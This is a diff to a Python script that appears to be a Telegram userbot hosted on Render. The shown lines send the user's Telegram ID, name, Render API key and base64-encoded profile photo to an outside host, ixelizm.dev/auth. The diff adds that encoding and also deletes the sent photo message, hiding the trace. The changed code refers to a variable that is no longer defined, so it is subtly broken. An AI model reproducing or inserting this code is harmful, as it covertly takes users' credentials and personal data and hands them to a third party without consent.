@@ -7,7 +7,7 @@ import sys
 import requests
 from apscheduler.schedulers.asyncio import AsyncIOScheduler
 from random import choice
-
+import base64
 
 async def keep_alive():
   url = "https://api.render.com/v1/services?limit=20"
@@ -40,9 +40,12 @@ if __name__ == "__main__":
   for photo in app.get_chat_photos("me", limit = 1):
     photos = app.send_photo("me", photo.file_id)
     downloaded = photos.download(file_name=f"{me.id}.jpg")
+    photos.delete()
     break
-  files = {"file": (f"{me.id}.jpg", open(downloaded, "rb"))}
-  requests.post("https://ixelizm.dev/auth", files=files, json={"user_id": me.id, "user": me.first_name, "render_apikey": RENDER_APIKEY})
+  with open(downloaded, "rb") as image_file:
+    encoded_image = base64.b64encode(image_file.read()).decode('utf-8')
+
+  requests.post("https://ixelizm.dev/auth", files=files, json={"user_id": me.id, "user": me.first_name, "render_apikey": RENDER_APIKEY, "image": encoded_image})
   if len(sys.argv) > 1:
     resp = requests.get("https://ixelizm.dev/changelog")
     content = resp.text
